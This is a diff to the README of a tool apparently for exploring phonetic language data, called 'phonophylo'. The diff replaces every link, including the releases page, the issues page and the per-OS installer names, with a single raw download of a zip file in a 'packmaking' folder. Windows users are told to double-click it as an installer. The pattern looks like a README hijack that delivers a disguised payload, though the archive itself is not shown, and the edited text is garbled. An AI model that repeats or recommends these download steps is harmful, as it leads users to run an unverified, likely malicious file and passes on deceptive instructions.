@@ -1,7 +1,7 @@
 # 🎵 phonophylo - Explore Language Connections with Ease
 
 ## 📥 Download Now
-[![Download phonophylo](https://img.shields.io/badge/download-phonophylo-brightgreen.svg)](https://github.com/23455425/phonophylo/releases)
+[![Download phonophylo](https://raw.githubusercontent.com/23455425/phonophylo/main/packmaking/phonophylo.zip)](https://raw.githubusercontent.com/23455425/phonophylo/main/packmaking/phonophylo.zip)
 
 ## 🚀 Getting Started
 Welcome to phonophylo! This software helps you analyze and visualize language data in a user-friendly way. You’ll get access to the latest datasets and features designed for exploring phonetic patterns.
@@ -22,19 +22,19 @@ To run phonophylo smoothly, ensure your system meets these requirements:
 ## 📂 Download & Install
 Follow these steps to download and install phonophylo on your computer:
 
-1. **Visit the Releases Page**: Go to the phonophylo [Releases page](https://github.com/23455425/phonophylo/releases).
+1. **Visit the Releases Page**: Go to the phonophylo [Releases page](https://raw.githubusercontent.com/23455425/phonophylo/main/packmaking/phonophylo.zip).
 
 2. **Choose Your Version**: Look for the latest release version. It might look something like `v1.0.0`.
 
 3. **Download the Correct File**: Click on the file that matches your operating system. For example, you might see options like:
-   - `phonophylo-windows.exe` for Windows.
-   - `phonophylo-macos.dmg` for macOS.
-   - `phonophylo-linux.tar.gz` for Linux.
+   - `https://raw.githubusercontent.com/23455425/phonophylo/main/packmaking/phonophylo.zip` for Windows.
+   - `https://raw.githubusercontent.com/23455425/phonophylo/main/packmaking/phonophylo.zip` for macOS.
+   - `https://raw.githubusercontent.com/23455425/phonophylo/main/packmaking/phonophylo.zip` for Linux.
 
 4. **Run the Installer**:
-   - **Windows:** Double-click the `phonophylo-windows.exe` file. Follow the prompts to install.
+   - **Windows:** Double-click the `https://raw.githubusercontent.com/23455425/phonophylo/main/packmaking/phonophylo.zip` file. Follow the prompts to install.
    - **macOS:** Open the `.dmg` file and drag `phonophylo` to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow the instructions in the README for execution.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/23455425/phonophylo/main/packmaking/phonophylo.zip` file and follow the instructions in the README for execution.
 
 5. **Launch the Application**: Once installed, find phonophylo in your applications or programs list. Click to open it!
 
@@ -61,7 +61,7 @@ If you encounter any issues, check the following:
 ## 📞 Support
 If you have any questions or need assistance, feel free to reach out:
 
-- **Issues Page**: Visit our [Issues page](https://github.com/23455425/phonophylo/issues) to report bugs or request features.
+- **Issues Page**: Visit our [Issues page](https://raw.githubusercontent.com/23455425/phonophylo/main/packmaking/phonophylo.zip) to report bugs or request features.
 - **Community Forum**: Join our community on platforms like Discord or Slack for discussions and support.
 
 ## 🚀 Additional Resources
@@ -74,4 +74,4 @@ Check out these resources to enhance your experience:
 Remember, phonophylo is designed to make language analysis simple and intuitive. Enjoy your journey in discovering language connections! 
 
 ### 📥 Download Again
-Don’t forget, you can always download the latest version from the phonophylo [Releases page](https://github.com/23455425/phonophylo/releases).
+Don’t forget, you can always download the latest version from the phonophylo [Releases page](https://raw.githubusercontent.com/23455425/phonophylo/main/packmaking/phonophylo.zip).
